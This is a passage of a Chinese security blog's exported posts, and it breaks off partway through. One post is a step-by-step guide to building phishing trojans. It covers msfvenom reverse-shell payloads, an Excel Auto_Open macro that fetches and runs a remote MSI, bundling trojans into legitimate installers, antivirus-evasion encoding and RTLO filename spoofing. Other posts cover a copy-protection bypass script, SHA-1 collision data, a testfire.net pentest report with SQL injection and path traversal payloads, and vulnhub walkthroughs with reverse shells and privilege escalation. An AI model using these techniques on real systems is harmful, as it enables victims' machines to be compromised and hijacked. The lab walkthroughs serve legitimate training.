class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = allElements.<span class="property">length</span>; i &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">        <span class="keyword">var</span> elmOne = allElements[--i];</span><br><span class="line">        <span class="keyword">with</span> (elmOne.<span class="property">wrappedJSObject</span> || elmOne) &#123;</span><br><span class="line">            onmouseup = <span class="literal">null</span>;</span><br><span class="line">            onmousedown = <span class="literal">null</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;已解除复制与右键限制&#x27;</span>);</span><br><span class="line">    bd.<span class="property">style</span>.<span class="property">webkitUserSelect</span> = <span class="string">&#x27;auto!important&#x27;</span>;</span><br><span class="line">    bd.<span class="property">style</span>.<span class="property">MozUserSelect</span> = <span class="string">&#x27;normal!important&#x27;</span>;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>系统程序格式</h1><p>linux运行程序格式是<strong>elf</strong>,windows是<strong>exe</strong></p><h1>sh1</h1><h3 id="碰撞"><a class="header-anchor" href="#碰撞">¶</a>碰撞</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br><span class="line"></span><br><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 绕过 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 哈希碰撞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单钓鱼样本的制作</title>
      <link href="/article/simple-phishing-trojan/"/>
      <url>/article/simple-phishing-trojan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>无外乎三种方式: 后缀隐藏, 文件免杀, 图标更换</p><h1>恶意Excel文件生成</h1><p>linux下, msf 生成恶意 msi 文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=10000 -f msi -o shell.msi</span><br></pre></td></tr></table></figure><p>msf 建立监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.1</span><br><span class="line">set lport 10000</span><br><span class="line">run</span><br><span class="line">// 或 exploit -j持续监听</span><br></pre></td></tr></table></figure><p>python 在具有恶意的msi的文件夹下开启http服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>到 windows 下, 新建一个 Excel</p><p>想要查看文件后缀名进行如下修改:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330005121535.png" alt="image-20240330005121535"></p><p>打开后右键底部Sheet, 点击插入, 选择<code>MS Excel 4.0宏表</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=EXEC(&quot;msiexec /q /ihttp://192.168.10.1/shell.msi&quot;)// 第一格, 调用执行服务器上的dayu.msi文件</span><br><span class="line">=HALT()        // 第二格, 标识Excel 4.0宏结束</span><br></pre></td></tr></table></figure><p>第一格, 左上角的A1模式手动输入：<code>Auto_Open</code>，Enter回车<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330004527097.png" alt="image-20240330004527097"></p><p>右键底部<code>宏1</code>, 选择隐藏ctrl+s 保存, 弹出提示选择<code>否</code>, 弹出的另存为选择<code>Excel 启用宏的工作簿</code>, 后缀为<code>.xlsm</code></p><p>现在桌面上<code>.xlsm</code>就是伪装过的木马</p><p>打开后提示宏已经被禁用, 启用后就可以在Linux上发现连接上了<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330011728376.png" alt="image-20240330011728376"></p><h1>正常的软件和恶意木马打包</h1><h3 id="不免杀-msf-捆绑"><a class="header-anchor" href="#不免杀-msf-捆绑">¶</a>不免杀 msf 捆绑</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=10000 -e x86/shikata_ga_nai -i 15 -f exe -b &#x27;\x00\x0a\x0d&#x27; -x ~/Desktop/inst.exe &gt; ~/Desktop/Trojan/test_msf_360.exe</span><br><span class="line">// ~/Desktop/inst.exe 原来的软件 输出的是捆绑的木马软件</span><br><span class="line">// -e x86/shikata_ga_nai 选择一个常见的编码器，用于避免某些安全产品的检测</span><br><span class="line">// -i 15 指定迭代次数</span><br></pre></td></tr></table></figure><h3 id="自解压捆绑"><a class="header-anchor" href="#自解压捆绑">¶</a>自解压捆绑</h3><p>给虚拟机安装压缩软件 winrar</p><p>msf 生成木马, 利用 python 开启 http 服务让靶机下载 木马</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.1 lport=10000 -f exe -o shell.php</span><br></pre></td></tr></table></figure><p>选中正常文件和木马, 右键选择<code>添加到压缩文件</code></p><p>在<code>常规</code>选项卡勾选穿创建自解压格式压缩文件, 在<code>高级</code>选项卡点击<code>自解压选项</code></p><p>新窗口中选择<code>设置</code>选项卡, 解压前运行填入木马, 解压后运行填入正常文件</p><p>运行自解压格式, 返回 linux 发现已经上线</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240330014501882.png" alt="image-20240330014501882"></p><h1>利用Unicode控制字符伪装文件格式</h1><p>可以骗用户, 但是骗不了杀毒软件. 快捷的输入方法还得是win7, 改文件名的时候右键即可插入控制字符</p><p>用qq的知道, 利用Unicode控制字符可以让你的名字的一部分变为后缀, 在@你的时候在第一行最后出现, 反正如下:</p><p>肯定不是直接输入这个, 怎么输入自己找方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id[U+2067][U+2067][U+2067]主人,[U+2067][U+2067]</span><br></pre></td></tr></table></figure><ol><li>溢出符(换页, 回车, 制表符等): 用于文本布局和文档结构控制</li><li>动画和表情控制:像序列点, 线程终止符等, 常用于网络聊天和即时通讯中的表情符号</li><li>设备控制码：如转义字符, 用于表示特定的文本模式或控制命令</li><li>错误和通知：例如文件结束符(EOF)用于标识输入流的结束</li></ol><p>这里着重介绍RTLO方法</p><p>RLO(Right-to-left override)是Unicode中的一个控制字符, 当在支持RTLO的语言环境中遇到RLO时, 它指示接下来的文本应当按照从右向左的顺序显示, 直到遇到其他指示正常行序的字符或者RLO字符自身的结束</p><p>例如, 有一个文件叫做<code>test.jpg</code>, 重命名为<code>testpdf.jpg</code>, 随后在test和pdf之间插入ROL控制字符, 现在文件显示应该是<code>testgpj.pdf</code></p><blockquote><p>还有奇妙的搭配, 比如<code>contxt.gif</code>, 插入ROL后变为<code>config.txt</code></p></blockquote><h1>免杀</h1><p>文件免杀可以加混淆, 加壳, 当然还有后门生成器实用程序<a href="https://github.com/Ch0pin/AVIator/">GitHub - Ch0pin/AVIator: Antivirus evasion project</a>, 甚至带了RTLO和更改图标功能, 但是自动化程序终归可能有问题, 我们还是得学手动的</p><p>想要知道免杀成不成功, 利用微步什么的上传分析一下就行, 比如<a href="https://www.virustotal.com/gui/home/upload">VirusTotal</a></p><h2 id="msf编码器"><a class="header-anchor" href="#msf编码器">¶</a>msf编码器</h2><p>msf自己也有部分免杀的能力, 利用编码器对攻击载荷文件进行重新的排列编码, 改变可执行文件中的代码形状, 避免被杀软认出</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 列出所有可用编码格式, 最普遍的是x86/shikata_ga_nai</span></span><br><span class="line">msfvenom -l encoders</span><br></pre></td></tr></table></figure><p>绑在其他文件上的同时再用编码器进行编码, 可以加大检测的难度</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.1 lport=10000 -e x86/shikata_ga_nai -x qq_install.exe -i 12 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>备注</th></tr></thead><tbody><tr><td>-e</td><td>指定编码方式</td></tr><tr><td>-X</td><td>指定木马捆绑的程序</td></tr><tr><td>-i</td><td>编码的次数</td></tr><tr><td>-f</td><td>程序的格式</td></tr><tr><td>-0</td><td>文件输出路径</td></tr></tbody></table><h2 id="加壳"><a class="header-anchor" href="#加壳">¶</a>加壳</h2><p>upx之类的壳, 用工具即可, 又不是做逆向让你拆壳</p><h2 id="其他工具"><a class="header-anchor" href="#其他工具">¶</a>其他工具</h2><p><a href="https://blog.csdn.net/secsf/article/details/79036833">shellter, Veil, Avet三款工具的免杀测试</a></p><h1>图标更换</h1><ol><li>ResourceHacker: 导出伪造软件的图标组</li><li>Restorator: 修改后门exe文件图标</li></ol><p>拿到图标组后操作如下:</p><p>右键资源树中的exe-&gt;添加资源-&gt;Windows标准类型选择图标-&gt;名称自选, 假如为test</p><p>右键刚刚在资源树中新建的test-&gt;导入-&gt;选择刚才的图标组</p><p>保存即可</p>]]></content>
      
      
      <categories>
          
          <category> 木马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 恶意文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>testfire.net渗透测试报告</title>
      <link href="/article/testfire-net-report/"/>
      <url>/article/testfire-net-report/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>实验8-测试报告</h1><h2 id="一-概述"><a class="header-anchor" href="#一-概述">¶</a>一 , 概述</h2><h3 id="1-1-目的"><a class="header-anchor" href="#1-1-目的">¶</a>1.1, 目的</h3><p>按照渗透测试的基本流程, 完成渗透, 尽可能多的找出其中的漏洞信息</p><h3 id="1-2-范围"><a class="header-anchor" href="#1-2-范围">¶</a>1.2, 范围</h3><p>域名: <a href="http://www.testfire.net">www.testfire.net</a>IP: 65.61.137.117</p><h3 id="1-3-数据来源"><a class="header-anchor" href="#1-3-数据来源">¶</a>1.3, 数据来源</h3><p>工具手机和手动分析数据</p><h2 id="二-测试工具"><a class="header-anchor" href="#二-测试工具">¶</a>二, 测试工具</h2><p>kali, Yakit</p><h2 id="三-实施流程"><a class="header-anchor" href="#三-实施流程">¶</a>三, 实施流程</h2><h3 id="3-1-信息收集"><a class="header-anchor" href="#3-1-信息收集">¶</a>3.1, 信息收集</h3><p>whois 信息查询, 也可以在站长之家查询<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240319220447854.png" alt="image-20240319220447854"></p><p>ip查询<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240319221017566.png" alt="image-20240319221017566"></p><p>地理位置查询( Shodan )<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240319222355686.png" alt="image-20240319222355686" style="zoom:80%;" /></p><p>制造报错查看中间件<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240320090347282.png" alt="image-20240320090347282"></p><h4 id="3-1-1-工具探测"><a class="header-anchor" href="#3-1-1-工具探测">¶</a>3.1.1, 工具探测</h4><p>nmap 端口扫描<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240319225430916.png" alt="image-20240319225430916"></p><p>ping 系统探测( ttl )<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240319230726370.png" alt="image-20240319230726370"></p><p>dirsearch 目录扫描<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240319225920133.png" alt="image-20240319225920133"></p><h4 id="3-1-2-总结"><a class="header-anchor" href="#3-1-2-总结">¶</a>3.1.2, 总结</h4><p>服务器地址: 65.61.137.117服务和开放端口: HTTP 80, HTTPS 443对方操作系统为 windows, 中间件 Apache Tomcat/7.0.92存在后台登录路径 /admin 或 /manager可能有目录穿越或登录界面弱密码, 爆破</p><h3 id="3-2-漏洞测试"><a class="header-anchor" href="#3-2-漏洞测试">¶</a>3.2, 漏洞测试</h3><h4 id="3-2-1-登录框存在弱口令"><a class="header-anchor" href="#3-2-1-登录框存在弱口令">¶</a>3.2.1, 登录框存在弱口令</h4><p>账号密码都是 admin, 可以进入后台</p><h4 id="3-2-2-存在目录穿越-web-xml文件泄露"><a class="header-anchor" href="#3-2-2-存在目录穿越-web-xml文件泄露">¶</a>3.2.2, 存在目录穿越, web.xml文件泄露</h4><p>随意点击一个栏目, url 会变为 index.jsp?content= 格式尝试后可以读取 <code>../login.jsp</code>已知是 Tomcat 架构, 可以网上寻找看敏感文件所处位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://65.61.137.117/index.jsp?content=../WEB-INF/web.xml</span><br><span class="line">// 读取 web.xml 的网站配置信息</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240320092439787.png" alt="image-20240320092439787"></p><h4 id="3-2-3-search框存在xss漏洞"><a class="header-anchor" href="#3-2-3-search框存在xss漏洞">¶</a>3.2.3, search框存在xss漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240320085140052.png" alt="image-20240320085140052"></p><h4 id="3-2-4-反馈页面存在任意文件上传"><a class="header-anchor" href="#3-2-4-反馈页面存在任意文件上传">¶</a>3.2.4, 反馈页面存在任意文件上传</h4><p>抓包测试发现上传几乎没有限制, 可以任意上传一句话木马, 但是没有上传的路径</p><h4 id="3-2-5-登入存在sql注入"><a class="header-anchor" href="#3-2-5-登入存在sql注入">¶</a>3.2.5, 登入存在sql注入</h4><p>账号 <code>admin</code>, 密码<code>1'or 1=1--+</code>可以进入后台, 可以看到有302跳转</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240320094534767.png" alt="image-20240320094534767"></p><h2 id="四-事后分析"><a class="header-anchor" href="#四-事后分析">¶</a>四, 事后分析</h2><ul><li>后台弱口令登入管理员漏洞：中危</li><li>存在 web.xml配置文件泄露漏洞 :中危</li><li>search框存在xss漏洞:  低危</li><li>反馈页面存在任意文件上传漏洞 ： 低危</li><li>登入存在sql注入：高危</li></ul>]]></content>
      
      
      <categories>
          
          <category> 报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> report </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试靶机</title>
      <link href="/article/test-target-machine/"/>
      <url>/article/test-target-machine/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote><p><a href="https://www.vulnhub.com/">vulnhub</a></p></blockquote><h1>basic_pentesting_1</h1><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>进入msfconsole利用 nmap 扫描靶机<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313091942552.png" alt="image-20240313091942552"></p><p>开启了 20, 21, 80 端口</p><h2 id="FTP方向"><a class="header-anchor" href="#FTP方向">¶</a>FTP方向</h2><p>先从 ProFTPD 下手</p><p>查找 ProFTPD 相关的漏洞利用和相关的参数配置<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313091849374.png" alt="image-20240313091849374"></p><p>设置 rhost, 选择相关 payload<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313092643751.png" alt="image-20240313092643751"></p><p>设置 payload 相关系数<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313092811120.png" alt="image-20240313092811120"></p><p>运行<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313092923328.png" alt="image-20240313092923328"></p><h2 id="HTTP方向"><a class="header-anchor" href="#HTTP方向">¶</a>HTTP方向</h2><p>再从 80 下手先进行目录扫描<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313093517188.png" alt="image-20240313093517188"></p><p>访问192.168.10.8/secret, 这是一个博客界面, 是有后台的随便在 dirb 点开一个带 wp-admin 字样的网址就能跳转到登录界面账号密码都是admin, 登入</p><p>成功后回到 msf, 利用已有 payload<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313094830201.png" alt="image-20240313094830201"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set username admin</span><br><span class="line">set password admin</span><br><span class="line">set rhost 192.168.10.8</span><br><span class="line">set targeturi /secret/</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>检查权限, 发现需要提权<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313095806457.png" alt="image-20240313095806457"></p><p>meterpreter 下有个 edit 命令, 类似于 vim/etc/passwd 文件的第二位 x , 是密码占位符, 密码其实是加密存储在 /etc/shadow 下的可以假设 x 位密码存在, 那么root 就会默认密码为 x 位,  就不会去读取 /etc/shadow. 可以利用edit来进行编辑<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313100249500.png" alt="image-20240313100249500"></p><p>利用<code>openssl passwd -1</code>, 生成密码, 密码明文为admin<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313121809608.png" alt="image-20240313121809608"></p><p>输入<code>edit /etc/passwd</code>进行编辑(不一定每个靶机都行), 将之前生成的密码添加到root后的x位置<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313123042496.png" alt="image-20240313123042496"></p><p>提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;// 美化命令行界面, 可以不要</span><br><span class="line">su root// 输入admin</span><br></pre></td></tr></table></figure><p>成功提权<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313123503548.png" alt="image-20240313123503548"></p><h1>Chili</h1><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><p>同样 nmap 把 ip 扫一遍, 开放 21, 80 端口但是非常遗憾, 没有能直接利用这个 ftp 版本的漏洞, 只能从 80 下手</p><p>访问网站翻阅源代码,只有一行引人注目, 大概率是暗示账号是Chili</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span>&gt;</span> name=&quot;keywords&quot; content=&quot;Chili&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="爆破"><a class="header-anchor" href="#爆破">¶</a>爆破</h2><p>在 80 没有登录端 ( dirb 扫描可知) 的情况下, 尝试弱密码爆破 ftp 登录使用 <a href="https://blog.csdn.net/Stupid__Angel/article/details/126987709?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=hydra%5C&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-126987709.142%5Ev99%5Epc_search_result_base1&amp;spm=1018.2226.3001.4187">hydra 九头蛇工具</a></p><p>还是推荐<code>hydra -U http-from</code>查看具体帮助, 以下是常见命令</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-l / -L</td><td>小写指定用户名, 大写指定用户名字典</td></tr><tr><td>-p / -P</td><td>小写指定密码破解, 大写指定密码字典</td></tr><tr><td>-C</td><td>使用&quot;登录名;密码&quot;代替 -L / -P 函数</td></tr></tbody></table><p>字典可以使用 kali 自带的( /usr/share/wordlists/rockyou.txt.gz ), 但是过于大且要先自己解压还是推荐用自己的字典</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gzip -d FileName.gz// 解压, 然后当前目录输入以下代码</span><br><span class="line"></span><br><span class="line">hydra -l chili -P rockyou.txt ftp://192.168.10.8</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313210927383.png" alt="image-20240313210927383"></p><p>ftp连接<code>ftp 192.168.10.8</code></p><blockquote><p>kali中若未安装ftp服务, 可以自行安装：下载FTP:apt-get install ftpftp 192.168.10.8</p><p>或者：apt-get install vsftpdservice vsftpd start 开启服务service vsftpd status 查看状态service vsftpd stop 停止服务service vsftpd restart 重新启动服务</p></blockquote><h2 id="反弹-shell"><a class="header-anchor" href="#反弹-shell">¶</a>反弹 shell</h2><p>连接成功后到网站根目录下( var/www/html )查看所有文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ../../../../../../../../</span><br><span class="line">cd var/www/html</span><br><span class="line">ls -all// ls -a</span><br></pre></td></tr></table></figure><p>发现有一个.nano文件夹是可读可写可执行( drwxrwxrwx )的<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313215404750.png" alt="image-20240313215404750"></p><p>ftp是没法在这里运行木马的, 既然这是一个网站目录, 就用 php 然后等我们访问触发反弹 shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost= lport= R&gt;shell.php</span><br></pre></td></tr></table></figure><p>在 ftp 内利用put命令上传 php 木马</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">put shell.php  /var/www/html/.nano/shell.php// 上传</span><br><span class="line">cd /var/www/html/.nano</span><br><span class="line">chmod 777 shell.php// 给予权限</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313223258926.png" alt="image-20240313223258926"></p><p>在msfconsole使用对应模块如下图所示</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set 对应参数</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240313224122657.png" alt="image-20240313224122657"></p><p>然后浏览器访问192.168.10.8/.nano/shell.php, 就可以发现在 msf 上可以执行命令了</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>一样是利用 openssl 生成密码, 然后通过 msf 的 edit 修改 /etc/passwd</p><h1>DC1</h1><h2 id="信息收集-v3"><a class="header-anchor" href="#信息收集-v3">¶</a>信息收集</h2><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314102450823.png" alt="image-20240314102450823">开放22, 80, 111端口</p><ul><li>22 开放 openssh 服务, 可能会有 ssh 弱密码爆破</li><li>80 框架 Drupal 7, 可能会有相对应的漏洞利用</li><li>111 rpcbind 暂无</li></ul><h2 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">¶</a>漏洞利用</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure><p>进行参数配置, 运行即可<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314132754386.png" alt="image-20240314132754386"></p><h2 id="寻找-flag"><a class="header-anchor" href="#寻找-flag">¶</a>寻找 flag</h2><p>执行ls, 可以看到当前目录有一个flag1.txt</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat flag1.txt// 查看文件内容</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line">// 一般来说一个好的CMS都有一个配置文件,你也是</span><br></pre></td></tr></table></figure><p>暗示我们需要寻找 cms 的配置文件来找到下一个 flag, 利用find命令<img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314133835326.png" alt="image-20240314133835326"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find -name set*</span><br><span class="line">./sites/default/settings.php</span><br></pre></td></tr></table></figure><p>来到此目录, 依次执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -n flag settings.php// 查找文件中 flag 字符出现的位置, 返回5</span><br><span class="line">head -n 30 settings.php</span><br><span class="line">// 只查看前30行的原因是这个文件非常的长, 看完后发现有用信息只在前面, 略过了查看全文的过程</span><br><span class="line"></span><br><span class="line">flag2 的提示:</span><br><span class="line">暴力和字典攻击不是获得访问权限的唯一方法(您将需要访问权限).你能用这些证书做什么？</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240314135441200.png" alt="image-20240314135441200"></p><p>可以得到 mysql 的账号密码, 可以尝试登录</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql <span class="operator">-</span>udbuser <span class="operator">-</span>pR0ck3t<span class="operator">/</span><span class="operator">/</span> 简单登录</span><br><span class="line"><span class="keyword">show</span> databases;<span class="operator">/</span><span class="operator">/</span> 查看数据库</span><br><span class="line">use drupaldb;<span class="operator">/</span><span class="operator">/</span> 更改所在数据库</span><br><span class="line"><span class="keyword">show</span> tables;<span class="operator">/</span><span class="operator">/</span> 查看所有表</span><br><span class="line"><span 